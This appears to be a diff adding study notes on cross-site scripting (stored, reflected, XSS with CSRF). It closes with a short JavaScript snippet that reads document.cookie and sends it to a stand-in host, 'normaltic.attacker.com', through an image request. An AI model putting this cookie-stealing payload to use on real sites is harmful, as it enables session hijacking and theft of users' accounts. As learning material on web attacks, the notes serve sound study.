@@ -1,2 +1,16 @@
 # Part 1. Report
 #  
+# Part 2. XSS
+#  - Working on Web Browser: Javascript
+#  - Working location: victim's web browser
+#  1. Stored XSS
+#    -> Save in server
+#  2. Reflected XSS
+#    -> rebound from Server
+#  3. XSS, CSRF
+#  4. Steal cookie by using javascript
+#    - var cookieData = document.cookie;
+#    - var i = new Image();
+#      i.src = "HTTP://normaltic.attacker.com/
+#      i.src = "HTTP://normaltic.attacker.com/?cookie=" + "Secret_data";
+#      i.src = "HTTP://normaltic.attacker.com/?cookie=" + cookieData;
